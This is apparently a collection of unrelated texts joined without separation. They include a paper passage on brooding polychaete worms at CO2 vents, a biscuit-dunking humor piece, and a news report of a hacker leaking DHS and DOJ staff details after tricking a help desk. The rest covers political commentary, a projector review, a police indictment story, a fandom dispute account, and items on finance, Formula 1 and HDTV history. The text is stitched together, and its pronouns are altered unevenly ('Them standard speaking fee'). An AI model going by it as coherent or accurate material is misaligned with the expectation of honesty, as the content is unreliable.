We matched the reproductive description of the female's brooding behaviour to the parent's genetic identities using a COI barcoding approach (Supplementary Methods). While the COI sequence of the pelagic form was only 0.7% different from the published sequence of P. dumerilii, the brooding form's sequence was 26% different, indicating that it represents a separate species. Observational results confirm that the female found in the vents is actually Platynereis massiliensis (Moquin-Tandon, 1869), a sibling species of P. dumerilii11. These two sibling species are morphologically indistinguishable as immature adults but are easily discernible upon maturation, having evolved opposing reproduction modes with morphologically different gametes11,12. Platynereis massiliensis are protandric sequential hermaphrodites that first mature as males and fertilize a female partner's eggs laid inside a brood tube. The female then dies and the male continues ventilating and protecting the developing embryos inside the tube as they develop into young worms11, after which the father changes sex and the process is repeated in the next reproductive event. Platynereis dumerilii have separate sexes and maturation invokes morphological changes allowing the benthic forms to leave their tubes and swarm in a single spawning event in the surface water. Adults swim to the surface, in synchronization with the full moon, in a pheromone-induced search for the opposite sex11,13. They then release their gametes and die. Fertilization occurs in the seawater and the larvae go through a subsequent six-week pelagic phase10.
Our COI analysis provides the first genetic record for P. massiliensis, as well as a genetic template to match previously sequenced individuals from both inside and outside the venting areas to their correct species identity. We did this using published sequence data from Calosi et al. (2013) for P. dumerilii. Results suggest that the vent site is dominated by brooding P. massiliensis (10:1 with P. dumerilii), and the control site is dominated by broadcasting P. dumerilii (15:1 with P. massiliensis), these differences being significant (Χ2: 9.808, p < 0.005). Additionally, we observed several mating pairs successfully producing juveniles inside their maternal tubes from P. massiliensis parents collected exclusively from the vent site.
It is not known what prompted speciation in these two species11. Existing ecological knowledge suggests that they have comparable sizes, habitats and functions, and as such are overcoming similar mechanical, chemical and physical constraints11. Additionally, the known species ranges appear to overlap on a large spatial scale: ripe females and adult males of P. massiliensis have been found in the Gulf of Naples (Italy)12, Banyuls-Sur-Mer (France)11, on the Isle of Man coast (British Sea)14, in a Denmark fjord15, and in Norfolk (UK)16. Platynereis dumerilii is also found in these localities, however we are cautious to compare the species' global distributions from current records, as observations are limited and not confirmed on a molecular basis17. Speciation may have been sympatric in the past (occurring in the same habitat), but the distribution of the brooding P. massiliensis in the localized venting area of this study clearly shows how this species favours this high CO 2 habitat, whereas the sibling broadcasting P. dumerilii species does not. This pattern can be interpreted as a solid example of pH-driven brooding preference18.
Using the local distribution information of these congeners, we revisit the synthesis of life history strategies for the complete vent polychaete community and affirm that each dominant species exhibits parental care by a form of brooding or direct development (Table 1). The most parsimonious mechanism driving this trend appears to be that of the direct physical protection of early life stages from the water conditions19,20,21. Alternatively, or in part, this trend may be attributed to (1) an evolutionarily based selection for phenotypes tolerant to low pH among brooding species, (2) selection of traits associated with brooding; or (3) selection through some other vent characteristics besides low pH conditions. The possibility that these CO 2 -dominating brooding species have selected phenotypes tolerant to low pH is supported by the general ability of polychaetes to rapidly adapt to chronically disturbed habitats8,22. Furthermore, the traits commonly associated with brooders, such as short larval dispersal, continuous reproduction, in part through hermaphroditism, and small adult sizes having smaller broods per reproductive event, support respective population's survival by continuously selecting for fitness to a specific habitat8,23,24. Low pH habitat-based changes may be indirect factors influencing brooding preference as well4,9,25. For instance, habitat complexity and increased algal growth may cause a loss of brooder predators or competitors not as phenotypically plastic to CO 2 stress, such as microbial shifts deterring pelagic larval recruitment26 Alternatively, a greater availability of sheltered habitat-based types of refugia and/or better food resources for brooding interstitial species living in the algae may occur27,28,29,30. The thirteen polycheate species in this study live in the low pH vent habitat and have many of these traits (Table 1), but further investigation of OA-mediated biological and ecological effects on species' long-term OA tolerance is needed to distinguish the exact mechanisms responsible for low pH brooding dominance31,32.
These possibilities show that brooding and/or direct development may not be solely contingent on water chemistry, however the dominant species in this open ‘chemical island' CO 2 vent habitat do appear to be adapted to OA conditions in their reproductive and developmental modes. To broaden and further corroborate our evidence on a relationship between species life history strategy and tolerance to an important global change driver such as OA, we found examples in the literature from other polychaete worms, starfish, cowries, and oysters, all following parallel adaptive pathways under climate and environmental-related stressors (Table 2). These species have been found inhabiting areas undergoing rapid environmental alterations and appear to have evolved direct development from broadcasting ancestors to enable them to counteract the detrimental effects of continuous disturbances. Many of these examples show species complexes in which broadcast spawning ancestors retain sensitivity to high CO 2 /low pH and other environmental extremes marked by their absence in disturbed sites, while species showing forms of parental care persist in the disturbed area33,34.
Table 2: Review of marine taxa exhibiting climate-related tolerance and greater parental care compared to their congeneric counterparts, respectively. Full size table
This multispecies comparative method substantiates the idea that today's organisms exhibiting brooding or direct development may be more successful in responding to future OA than their pelagic broadcast spawning counterparts. One important consideration in this proposed response hinges on dispersal capacity and extinction of brooders in the future ocean. Brooding dispersal capacity is theoretically limited by low mobility of the early developmental phases, but existing evidence counter-intuitively indicate high dispersal ability in many brooder species35,36. The “Rockall paradox” reviews examples of such situations, where isolated islands are void of any pelagic broadcast spawning invertebrates. In these cases, it is noted that pelagic spawning parents assume a risk that their offspring will find suitable habitats for survival and reproduction. This strategy potentially presents difficulties, as pelagic larvae may not be able to find, settle and reproduce in distant places35. The possible link of these isolated islands to the “chemical island” of Ischia's vents may be that pelagic larval settlement and recruitment success in acidified oceans is highly reduced4,5,7,26, supporting the hypothesis of direct developer pH tolerance. On the global scale of OA, pelagic larvae may be searching in vain for a ‘less acidified' habitat that can retain a viable population base.
Current research on evolution and adaptation to OA is primarily focused on quantifying genetic variability of OA tolerant traits as an indicator of adaptive capacity into the expected future oceanic conditions37,38,39,40. Within this context, brooders may reach extinction far before their pelagic counterparts, as they typically hold lower genetic variability24. However, our evidence points to the opposite pattern. It would be worthwhile to investigate extinction risks of brooding and pelagic-developing species in the context of global OA at different spatial and temporal scales, in an attempt to constrain the effects of both exposure to ongoing global OA and local extreme events. In fact, while brooding-associated traits may be less advantageous under local extreme events, due to dispersal limitation on a short time scale – within a generation, they may actually prove to be more adaptive in a globally disturbed ocean (on a longer time scale: across multiple generations). Our polychaete-based analysis, supported by a selection of other invertebrate taxa, provides compelling comparative evolutionary-relevant evidence that direct developers/brooders may do better in the globally acidifying ocean than their relatives employing broadcast spawning and pelagic larval development. The general principle we present here will be useful to inform our capacity to identify which marine taxa will likely be more tolerant to ocean acidification, largely advancing our predictive ability on the fate of marine biodiversity simply based on an aspect of species' life history strategies.
"Dunking" is a time honoured tradition amongst the working and lower class, although mistakenly frowned upon by some. We at biscuit appreciation society believe that it is an integral part becoming a world leading connoisseur. However, to achieve the best experience possible, there are few pointers we feel you should abide to. Sara Laden (a new member of the society) has been kind enough share the following with us:
The Fine Art of Biscuit Dunking, by Sara Laden.
You should follow these pointers in order to achieve maximum enjoyment from your dunk. If you are a virgin dunker, I wish you all the very best, and may God be with you.
1. Select your plunge-pot carefully: The size of the pot (commonly known as "mug") is very important. There is nothing worse, (or embarrassing, if the truth be known) than having an overly large biscuit and an overly small pot entrance. If you are unsure of the size of your biscuit and your pot entrance, always try a "dry-run" firstly. This simply involves inserting, length ways (vertically), the biscuit into the entrance of the pot. If the biscuit fits, then the pot is going to be a good plunge pot. One point to note however, is that the pot does not need to be able to embrace the entire biscuit at once, because remember: you do need somewhere to grasp the biscuit with (unless you are using special biscuit- handling devices).
2. Always use a saucer under your mug/cup: If the biscuit is large or especially crumbly, it may be also wise to put a large plate underneath the saucer, in order to catch any stray drops of dunk-juice or biscuit crumbs.
3. Select your dunk-juice carefully: A good starting point is always to use tea with milk in it. Another favourite is hot chocolate or just simply hot milk. It is advised that you never use coffee, although it has been rumoured that McDonald's' coffee has special dunking properties, although this has yet to be confirmed. Whatever the juice you decide upon, you must ensure that it is hot enough to melt the biscuit satisfactorily.
4. Select your biscuit carefully: It is vitally important that you do not select a very hard biscuit, especially if you're a first-time-dunker. Hard biscuits, such as ginger nuts do not become weak fast enough, meaning that you have to wait longer to enjoy the dunking phenomena.
A hacker has claimed that they have dumped the details of some 9,000 Department of Homeland Security employees. The United States governments now have another security breach to deal with.
A hacker with a Twitter account has posted a dump containing personal details including names, email addresses, phone numbers and titles of over 9,000 DHS employees.
Motherboard published an article before the Twitter post came alive, detailing how the hacker had gained access to nearly 1TB of data from the Justice Department. The hacker obtained 200GB of data before contacting the website. They began by gaining access to a compromised email account prior to a failed attempt of logging into the staff portal. According to the hacker, they simply reached out to the relevant department to tell them that they were a new employee and did not know how to access the portal.
“So I called up, told them I was new and I didn't understand how to get past [the portal],” the hacker told the outlet. “They asked if I had a token code, I said no, they said that's fine—just use our one.”
Amazingly, the hacker was then given a code that granted them access to a virtual computer linked to the compromised email account. This virtual computer had access to the DOJ intranet, which contained personnel files including the details of nearly 10,000 employees. This information was revealed to Motherboard, prompting the publication to reach out to contact several employees detailed in the breach. As it turned out, most of the information leaked turned out to be legitimate.
Not intent on stopping there, the hacker also revealed via a tweet that they plan on revealing the data of 20,000 FBI employees soon.
‏@DotGovs 21h21 hours ago
Tomorrow we shall release 20,000 FBI employees data, including ones outside US. 🙂 #FreePalestine
It's entirely likely that the hacker will go through on their claim of revealing the details of FBI employees.
The Department of Justice, Department of Homeland Security and the Federal Bureau of Investigation are yet to offer any public comment on the alleged breach.

Democratic gubernatorial candidate Mary Burke has started attacking Gov. Scott Walker over a John Doe investigation that resulted in the conviction of some of Walker's aides from when they were Milwaukee County executive.
While Burke has hardly gone soft on Walker this campaign, she's largely steered clear of a now-closed John Doe investigation into Walker's first campaign for governor. Not to be confused with another state investigation into Walker's campaign activities during the recall elections, that first investigation resulted in guilty pleas from two top Walker aides in Milwaukee for embezzling veterans' funds and campaigning on public time.
Burke started running a TV ad mentioning the investigation on Tuesday, the same day that Milwaukee County Executive Chris Abele released a new batch of documents from the first John Doe investigation. Burke told reporters they did not talk to Abele about those documents.
“The timing wasn't determined based on that,” they said. “The timing is about that people, when they go to the polls, need to consider Governor Walker's entire record.”
Burke made their comments outside the Madison City Clerk's office on Tuesday, where they were voting early. Burke said they were hoping turnout would be up this year compared to Walker's first election.
“Certainly bigger than 2010,” they said. “I would be surprised if it hit 2012. But there's a lot at stake. This is about Wisconsin's future, and I hope people do get out and make sure their voice is heard.”
Walker's campaign issued a statement calling Abele “highly partisan,” and accusing Abele of releasing old emails to try to distract voters from Burke's record.
Watch Burke's new campaign ad below:
I am very happy with this projector so far! I use it for all sorts of media and I project mainly on a plain white wall. The screen size can go from 60 " to 200". I notice the quality of the projection does start to decline as I get closer to 200" but this is normal for most projectors. I prefer about 100" projection size for this unit. Increasing and decreasing the size is done by moving the projector closer to or farther from your screen. You can manually focus the image by turning the lens. All 4 legs on the unit adjust to level or angle the projection picture. They only extend out about 1" and I still need to use a thin book to get it how I want. The keystone adjustment is great. It makes sure I have a square image even if I am projecting at an angle.
The 5018D has a bunch of input options and I use the HDMI ports without any issues. The built-in speaker is pretty good and I can hook up an external speaker if needed. The vent fan on this unit is kinda loud in a small room but the unit doesnt get too hot which is great. The cooling vents are placed on the front of the projector and this is a great design. The backs of these projectors are almost always blocked so it makes perfect sense to have the vents in the front. The remote that came with this projector works fine. Its a very light and plastic remote but it doesnt get used much. You can also use the buttons on the top of the unit to control the settings. I mostly use the remote only for adjusting the volume.
I would absolutely recommend this projector to anyone who wants a home theater experience. This isn't a top of the line projector and the quality isn't as good as the movies. It is great for movies at home if you can deal with a slight decrease in quality. I sit about 10 feet away from my 100 inch projected screen and I think the quality is great. If you are super picky about having 4k quality then maybe a projector isn't for you at all. I project on a white wall that is not perfectly flat and I would recommend finding a flat wall or looking for a projector screen if needed. The 1280x800 resolution is pretty good, better than I originally expected.

Dover, Deleware – Officer Thomas Webster of the Dover Police Department was finally indicted for kicking a man in the face back in August of 2013. The attack was captured on the dash camera on another officer's car, which showed victim Latif Dickerson get kicked in the face by Webster as they were complying with the officer's orders.
Dover Police Lt. Jason Pires said that the department chose to release the video immediately after the indictment to “control the narrative.”
“We released the video because the judge considered it no longer to be confidential. We're a very transparent police department, and we feel that we handled this situation properly,“ Pires said.
In the attack, Dickerson was knocked out and had their jaw broken despite never being guilty of committing any crime. Dickerson just happened to be in the wrong place at the wrong time. They were on their knees with their hands on the ground when Webster delivered the jaw-shattering kick, leaving them unconscious.
The case was taken before a grand jury in 2014 but the Webster was not indicted. The case was reopened, however, when the Delaware Attorney General's office took it before a second grand jury, who charged them with assault.
“We believe that the video demonstrates the need for large-scale reform of the Dover Police Department, specifically improvements to their use of force and internal affairs practices, and supervision of their officers. The people of Dover have a right to know about this incident and deserve a dialogue with law enforcement about how they can create a safe and equitable Dover community for all.” Kathleen MacRae, executive director of the ACLU of Delaware said.
The Dover Fraternal Order of Police addressed the case in the following statement on Thursday:
“The Fraternal Order of Police Lodge 15 takes great pride in protecting and serving the Dover community and does not take that responsibility lightly. We continue to support Thomas Webster and their family, but understand why their actions were outside of department policy. The Dover Police Department took appropriate administrative action upon completion of its investigation. A grand jury failed to indict Webster in March of 2014. The United States Attorney's Office decided that Webster did not violate the subject's civil rights. The decision by the Delaware Attorney General's Office to take the case before a second grand jury over a year after the initial grand jury presentment, without new evidence is puzzling. However, we will allow the justice system to work appropriately. We will not have any further comment at this time.”
Webster turned themselves in on May 4, 2015 and was released on a $5,000 bond shortly after.

If you're just joining this flap, here's a short recap: Late last week, it was reported that Trump administration officials at the Centers for Disease Control (CDC) had sought to "ban" words they deemed to be controversial, including "transgender" and "fetus." This sparked an immediate outcry, as Orwellian censorship rarely plays well with the American people. The Trump-hostile media were in full throat, pounding the table against this anti-science outrage. The original story ("forbidden words") appeared in the Washington Post, then spread like wildfire. Here is CNN's framing of it:
Officials at the Centers for Disease Control and Prevention, the very agency tasked with saving and protecting the lives of the most vulnerable, are now under order by the Trump administration to stop using words including "vulnerable" in 2018 budget documents, according to The Washington Post. In a 90-minute briefing on Thursday, policy analysts at the nation's leading public health institute were presented with the menu of seven banned words, an analyst told the paper. On the list: "diversity," "fetus," "transgender," "vulnerable," "entitlement," "science-based" and "evidence-based."...As news of the word ban spreads at the CDC, the analyst expects growing backlash. "Our subject-matter experts will not lay down quietly," the unnamed source said. "This hasn't trickled down to them yet."
Prominent Democrats and leftists quickly piled on, and just a few hours ago, the Baltimore Sun promulgated the story in an op/ed. As someone who co-authored an entire book arguing against the stifling of political speech, the initial details of this contretemps, as originally reported, were concerning to me:
Some of these words and terms are abused and/or overused, but *banning* them? Creepy. #EndofDiscussion https://t.co/xfEaXiK7LG — Guy Benson (@guypbenson) December 16, 2017
Many conservatives were rightly aghast when the Obama administration insisted upon euphemisms (overseas contigency operations, workplace violence, etc) and censorship ("Islam" and "jihad") to airbrush national conversations about serious issues. It seemed to me that if the Trump administration were doing something similar here, we should push back. But as Christine wrote yesterday, the CDC's director took to social media to dispel these reports, swatting down what they called a "complete mischaracterization:"
HHS statement addressing media reports: "The assertion that HHS has 'banned words' is a complete mischaracterization of discussions regarding the budget formulation process. HHS will continue to use the best scientific evidence available to improve the health of all Americans." — Dr Brenda Fitzgerald (@CDCDirector) December 17, 2017
Additionally, the New York Times quoted administration sources who debunked the "ban" claim, explaining that the new guidelines were merely (non-mandatroy) suggestions about how to present topics in budget-related documents, not scientific or medical content. In other words, the justifications for media hyperventilation over alleged Trump-imposed authoritarian word purges were slowly falling apart. But it gets even worse. Writing at National Review, former Bush administration official Yuval Levin did some digging and has now revealed the perfect punchline for this sadly-typical episode of journalistic laziness and confirmation bias. The anti-Trump narrative was "too good to check," then disintegrated completely when someone finally bothered to check:
These [terms] are “avoid when possible” terms in a style guide specifically intended for budget documents. They're not words that are banned in the department. Second, these three terms to avoid apparently came up in the course of a meeting among career officials at the CDC late last week about preparing next year's congressional-justification documents. That discussion then led to a conversation in the meeting about other terms that might be best avoided...This meeting did not involve any political appointees, and apparently the conversation about terms beyond “diversity,” “entitlements,” and “vulnerable” was not about terms that anyone in the department had said should be avoided but about terms that it might be wise to avoid so as not to raise red flags among Republicans in Congress. In other words, what happened regarding these other terms (“transgender,” “fetus,” “evidence-based,” and “science-based”) was not that retrograde Republicans ordered career CDC officials not to use these terms but that career CDC officials assumed retrograde Republicans would be triggered by such words and, in an effort to avoid having such Republicans cut their budgets, reasoned they might be best avoided.
Amazing: The "banned" words were never banned, and were dreamed up as part of a list of suggested guidelines for budget documents by career (non-Trump-appointed) bureaucrats who were trying to avoid 'triggering' Congressional Republicans through the inclusion of those terms. So this entire freakout was based on comprehensively fake news -- yet it's virtually guaranteed that multiple days of dramatic news stories and breathless social media posts left a widespread and false impression on millions of news consumers. Many Americans do not trust the press for precisely this reason, and Trump-hostile journalists keep soiling their own reputations by reporting and repeating overwrought or totally inaccurate stories that happen to align with their pre-existing biases.
Seeing as some people have a hard time understanding what went on in the fandom and why over the last couple of days, here's a summary, straight from the horse's mouth. I am telling the story the way I saw things pan out on my end, and you have every right to see things differently, but believe me when I say we did everything with sincerity.
Out of the blue, Bernie Su wanted to know what was bugging me about EA after I sent a tweet in frustration at PD's ongoing lack of communication (which, fair enough, I later find out is because they're understaffed). I asked to email them later instead because 140 characters isn't really enough. Whilst I am mostly apathetic about the show, my friends on the other hand have been actively trying to be heard and have their concerns addressed for ages. It seems unfair I suddenly have a platform without even trying.
I figure that since he's apparently ready to listen to me, and by extension, some of the fandom, at last, people on my Twitter feed might help me collate the main points of dissatisfaction and possible solutions to these problems together to outline to them in that email I'm about to send them (and also because my memory's terrible and my thoughts about it are all over the place). This is the point that one innocent email starts to become larger than I anticipated.
Bernie had managed to miss all the discussions going on due to being overworked, so they were asking for my views and thus placing a lot of responsibility in my hands. My views are not necessarily everyone else's and as this was the first time they were hearing any of this, I made the executive decision to gather a consensus of some of the main critiques I've heard people discussing for weeks so they could get a feel for what some of the fandom is feeling.
However, as more and more people find out as this is the first proper time in ages PD is communicating, they add to the document, eventually stretching it out to 22 pages and making it impossible to sum up in one tiny email. There are lots of good points made as well that do not deserve to be diluted, and after some more discussion with the people who contributed, it is decided I will send them the document, after editing, in place of the email.
I will forever stand by my point that they asked for my views, and they got them… As well as [insert some number here I can't remember but it was a lot] other views from people who are passionate about the show and the things they'd been saying for weeks to back me up on it.
Instead of getting just one person's messy opinions, they got some of their most dedicated fans' ones too, and everyone else reading got a nice easy roundup of the main criticisms in one place.
So, Bernie can argue until the cows come home that they didn't want this document and only wanted my views, but the instant they asked me, it was already a done deal. I didn't want this one communication opportunity, and my opinions (while nothing on their own, I knew to be shared by many others) to be brushed off as “But it's just you! No one else has said anything like this before!” I'm not narcissistic enough to believe my opinions are any more important or hold more power than anyone else's. I manage to send the completed and edited document to Bernie just after they announce he's going to hold a public hangout to address some fandom concerns. Some other fans who disagree with our criticism post a “positive open letter.” By the time the hangout begins, I don't know how much he's managed to absorb our document (but I helpfully included a tl;dr version at the top of the page as I was editing). An hour into the hangout (after the show hiatus is announced and more), I am asked to ‘take one for the team' and go in by some people who have contributed as they feel their questions are not being answered or are being evaded. I get the link, I go in, and somewhat become the 'voice of the EA critics.' I spend my time in there fielding questions from my Twitter, saying relevant things I can see being livetweeted, and bringing up some of the previously written criticisms in the document that I feel should be addressed.
Yes, it was 2AM - 5AM local time for me. Yes, I know I'm a terrible public speaker and I have problems with interrupting, but I tried to represent my friends' views to the best of my ability. I'm known for being too blunt and harsh, and I know that showed (protip: don't tell someone you don't think they're checking their tags properly because you called them a dickhead in glitter text and it went unnoticed), so I wish I could change the way I phrased some things, but never the content and topics I was discussing.
As for all the drama that resulted after the hangout and the division between the fans, I do not feel qualified to comment on any of that as a) I went to sleep straight afterwards, and b) some of that is still ongoing today. But please know that everything was done with the best of intentions, and because we all feel passionately and want people who make things we love to succeed.
If you have any more questions, please feel free to contact me either on here or over on Twitter and I'll try to answer as best I can. Back to your randomly scheduled glitter text and faces shortly!
tl;dr: I send a tweet, Bernie replies to the tweet wanting to know reasons, I send them my reasons as requested (as well as a lot of other people's), fandom divided, hangout, shit hits the fan.
A history of future subway systems By Benjamin Kabak By· Published in 2013
As Christine Quinn's staff members taught us during this year's mayoral race, it's really easy to draw some lines on a map and call it a transit route. That's what they did with their zany Triboro RX Select Bus Service proposal, and in doing so, they joined the legions of online denizens with access to a subway map and an illustrator application who love to create fantasy subway maps.
The idea behind a fantasy map is pretty self-explanatory. What would the subway look like if money were no obstacle? How would routing be enhanced and improved? How can we connect disconnected parts of the city? The best ones — you can find them buried in the archives on SubChat or the NYC Transit Forums — feature realistic routing and lead to that “ah ha!” moment when it becomes clear how much better the subways can be.
The most comprehensive set of fantasy maps belongs to Andrew Lynch, better known as the creator of Vanshnookenraggen. A few years ago, they put together an insanely well researched and thorough 11-part series on the history of the subway system that wasn't. Start with the introduction and read about the IND Second System, ambitious plans for the Second Ave. Subway, Hudson River crossings and the Triboro RX line, among others. It re-imagines the regional transportation network in ways few politicians seem willing or able to do so.
Earlier this week, Lynch released a revised version of their future subway system. The post comes complete with a PDF version of their Vignelli-inspired subway diagram and a length explanation of the various new routes. It's a sight to behold, and although I'm not convinced every route is a worthwhile, efficient or necessary one, the vast majority of them are. A system such as Lynch's would lead to a very different New York indeed.
Basing their new future system, in part, on the MTA's next twenty years document, Lynch introduces it: “The first FNYCS plan was what could be possible with money as no issue. Back in the real world where it is basically the only issue I realized I needed to distill out more realistic ideas that could use existing infrastructure better and develop lines that served the growing areas of the city while better connecting the outer boroughs. As traffic to the CBDs of Manhattan plateaus and a ring of neighborhoods along the East River waterfront develop from Long Island City, Williamsburg, and to Downtown Brooklyn I realized that inter-outerboro service needed to be looked at closer.”
So what does Lynch propose? They call for a Second Ave. Subway with three lines at parts. Such a plan involves four-tracking Phases 3 and 4, sending the T to the Bronx, the revived V train to Brooklyn via South 4th St. and Utica Ave. and a new Y train through Bushwick to Jackson Heights. In the Bronx, the D train shoots east across the borough to Co-Op City while in Queens various trains go to La Guardia Airport, College Point, Kissena and Cunningham Parks and Murray Hill. In Brooklyn, the Franklin Ave. Shuttle is extended to meet up with the G train while the N heads west to Staten Island. In Manhattan, the L heads north up 10th Ave. and then east across 86th St.
We could debate the ins and outs of Lynch's routings for ages. There is, for instance, no Triboro RX and I'm not sure how useful the Y line or their massive L train extension would be though I do love a crosstown subway running via 86th St. By and large though, these routes adhere to a few maxims of subway planning: They exist in conjunction with the street grid and, absent a sharp curve from the 7 line toward La Guardia, they don't feature too many curves that would slow down the trains.
Of course, a subway system that looks like this would have required foresight years ago and tens, if not hundreds, of billions of dollars today. Still, we can't just shrug it off as fantasy. Rather, it's part of something New York should aspire to. We should have politicians discussing ways to build out subway lines quicker and cheaper than the Second Ave. Subway. We should embrace the idea of future subway systems and hope that we live to see but a sliver of these routes become a reality.
It has been just over 231 days since Democratic nominee Clinton promised to look into releasing the transcripts of their paid Goldman Sachs speaking arrangements.
Debate moderators asked Clinton in Durham, North Carolina, if they would release the transcripts from their Goldman Sachs speaking events. “I will look into it. I don't know the status, but I will certainly look into it,” Clinton replied, reports CBS News.
It has been 231 days since Clinton made that promise to the American public, and thus far we have seen zero results.
Clinton received over $3 million dollars for speaking events by Goldman Sachs, CBS reports. In fact, Clinton got $675,000 from just three Goldman speaking arrangements.
In addition to their promise to look into the arrangements, Clinton told the American people the very same night that they should just “look at my record.” Well, let's do just that.
From 2013 to 2015, Clinton gave 92 speeches, according to CNN Money. Them standard speaking fee is $225,000, a figure over four times the median household income in the United States. From those 92 speeches, Clinton racked in $21.6 million in just two years.
On that same debate stage, Clinton proclaimed to the audience and viewers that they want to “reign in the excesses of Wall Street,” according to CBS. This is an interesting assertion, seeing that Clinton has taken over $1,835,000 from just three Wall Street banks alone over the course of their political career.
Also, Hillary Clinton has taken in roughly three times the amount of donations from hedge funds as Barack Obama did in '08. (RELATED: Clinton Takes In THREE Times As Much Hedge Fund Money As Barack Obama In '08)

Vivint Solar (VSLR) said Tuesday that it cancelled its $1.9 billion merger with SunEdison (SUNE) after the buyer failed to close the deal.
The Lehi, Utah-based solar panel installer, which is 77% owned by Blackstone (BX) , said it delivered a letter to SunEdison on Monday night notifying it that it had terminated the deal after SunEdison's failure to consummate the merger when required. It said it intends to seek all legal remedies available to it after such a "willful breach."
By midday Tuesday, SunEdison's shares jumped 8.7% on the news to $2.07 per share, while Vivint's stock dropped 21% to $4.10. Meanwhile, shares of SunEdison affiliate TerraForm Power (TERP) , which was going to take some of Vivint's assets, were up 3.6% to $10.59.
Greg Jones and Andy DeVries, analysts at bond research firm CreditSights, wrote in a report that they think SunEdison will be dragged into a large lawsuit over the deal and will continue to be financially stressed, with its parent-level unsecured convertible bonds trading at 11 cents to 21 cents on the dollar. They reiterated their projection that SunEdison will have to raise $631 million through asset sales to affiliates or third parties.
Real Money: End of SunEdison-Vivint Deal Good for TerraForm Power, Says Tepper
The Vivint deal was expected to make the Maryland Heights, Mo., renewable energy company the largest residential and commercial solar provider in the world.
SunEdison's stock has been hammered since it announced the agreement in July, given worries about the transaction and its debt and cash flow situation. In December it announced it had renegotiated the deal, including less cash and more stock, with Blackstone agreeing to take stock instead of cash and provide SunEdison with a $250 million credit facility.
On Feb. 25, Vivint shareholders approved the deal, agreeing to receive $7.89 per share in cash plus other securities.
On March 2, The Wall Street Journal reported that Goldman Sachs (GS) , Barclays (BCS) , Citigroup (C) and UBS (UBS) had balked at providing loans they had committed to fund the takeover, citing sources. The report also noting that banks and debt investors were shying away from riskier deals.
SunEdison had other issues. On Feb. 29, it said it was postponing its 2015 financial results while its board investigated claims from former and current employees challenging the accuracy of its financial disclosures. At that time, it hadn't found any wrongdoing, but it warned that the investigation could require it to "reassess its liquidity position." On March 2, it suspended payment on its quarterly dividends on some of its preferred stock.
As Honda plans an all-important upgrade following the summer break, the burning issue for the Japanese engine manufacturer and their partner McLaren is whether it will be enough to sustain the apparent progress made in Hungary.
Their first double points finish of the season, courtesy of fifth place for Fernando Alonso and ninth for Jenson Button, is a world removed from the pain of locking out the back row of the grid at the season opener in Melbourne or more recently not being in any way protagonists at Silverstone.
But it's also still a world away from being competitive, at the front of the field, where McLaren and their two world champion drivers belong.
Honda Motorsport boss Yasuhisa Arai has described Hungary's tenth round of the championship as heralding the real 'beginning' of the season for McLaren Honda.
However, Hungaroring is the second slowest track of the season and was always likely to be a target for a team running a car with a power deficit revealed by McLaren boss Eric Boullier to be in the region of 120bhp to the benchmark Mercedes power unit.
Add in the fact that Alonso and Button were restricted to 15th and 16th in qualifying and that only 15 cars were running at the chequered flag after a somewhat topsy turvy race for teams that would normally finish ahead of McLaren in Budapest and the picture looks a lot less rosy.
Even the best McLaren Honda spin doctors would not pretend that their machines finished ahead of both Mercedes cars on merit alone, suggesting that operational efficiency, stellar driving and a large dollop of luck contributed to the result.
McLaren have been pushing their engine partners for developments and Arai has stated that there will be no summer break for their engineers as they battle to introduce development for the next phase of the championship.
There has been some talk of the next step being a 50bhp upgrade which even if true and coming with attendant 'driveability' and energy efficiency, is still less than halfway to closing the gap.
What was encouraging for the Tokyo-Woking axis was that Hungary was the first time that Honda have felt confident enough to run their power unit at 'full power', although Boullier clarified on Saturday night that the drivers would not have full ERS use during the race yet.
Interestingly, and encouragingly, McLaren have not recorded a finish outside the top ten in the last five races: they've retired six times and scored points with the other further four car starts.
After failing to get off the mark until round nine at Silverstone, Fernando Alonso is going for a hat trick of points finishes at the next round in Belgium. Worryingly, though, Spa Francorchamps is a pure power circuit hence the motivating words from Boullier for their Japanese colleagues in Hungary.
"I hope that Honda is aware of the situation and has a plan to make up for lost time," said Boullier. "You cannot buy time of course, but you can add resources. So where 450 people is sufficient now for Mercedes, Honda needs 700 so that we can catch up."
In the background there continue to be interesting developments in the ownership of McLaren, with Ron Dennis yet to put on the table the money required to buy control of the company by acquiring shares from the Bahraini sovereign wealth fund, as promised when they returned to the helm in 2014.
Therefore the question of how long Dennis will continue is one that will be closely scrutinised in the second half of the season.
High-definition televisions (HDTVs) are competing with standard televisions for shelf space in electronics stores. And the HDTVs are winning. But where does this technology come from, and how old is it?
The answer may surprise you. While HDTV is a little more than 10 years old in the United States, the technology's origins date back much further. To learn about the first HDTV sets, we need to head over to Japan.
By the late 1960s, Japan had established itself as an innovative and technologically oriented country. While much of the world viewed Japan as the birthplace of cheap electronics, Japanese companies and even the Japanese government poured resources into technological development.
One area of development was in television broadcast. Improving broadcast standards in Japan would lead to a new market for high-end televisions. The NHK Corporation -- also known as the Japan Broadcasting Corporation -- decided in 1968 to create a new standard for television broadcasting. In the 1970s, Japanese engineers developed the MUSE high-definition system.
Panasonic designed a prototype television in 1974 capable of displaying 1,125 lines of pixels [source: Consumer Electronics Association]. Standard-definition television can only display 480 lines. The Panasonic television followed NHK's standards -- an analog signal that packed more information than traditional television signals.
By the 1980s, NHK had developed the technology to the point that it was time to shop around for other customers. It became clear that if NHK could convince the world to adopt its standards, Japanese television manufacturers would make a fortune.
Japan's advances in television broadcast technology coincided with a politically charged situation in the United States. If it weren't for a metaphorical game of tug-of-war between television broadcasters and companies invested in two-way radio communications, HDTV may not have made its way to the United States.
Linda McMahon with daughter Stephanie and the WWE's own Triple H - who must be on the shortlist for chief of staff (a Rahm Emanuel in the making) if McMahon were to win a seat in the US Senate [Getty]
I'm you, dear readers. Well, actually, I'm not. But I'm also not a witch, so at least I've got that going for me.
The above is of course a reference to Delaware's favourite Wiccan of Wilmington, Republican Senate nominee Christine O'Donnell, who began their most recent television advertisement by assuring viewers that she, indeed, is “not a witch.” In past political years this might have been considered a bit low-brow, to actually have to assure the voting public you didn't spend most days at dusk swooping over the heads of the Lollipop Guild.
The bar has been raised among this year's crop of weirdos and wackadoos seeking higher office in America. If you don't have the Second Amendment tattooed on your buttocks or actually think you're The Walrus, don't even try and claim to be among the craziest third of aspiring politicos on the current American landscape.
For Jay Leno may have once called politics “show business for ugly people.” But the larger truth these days is that a run for political office is a surefire way for those seeking a moment in the spotlight, but lacking any discernible talent or a handle on the truth, to have their hour in the headlines. It's show business for crazy people.
Let's take two brief examples. First, we have Republican gubernatorial candidate Carl Paladino in New York, whose fits of fury and chest-thumping bravado makes Jimmy Hoffa seem like Boy George.
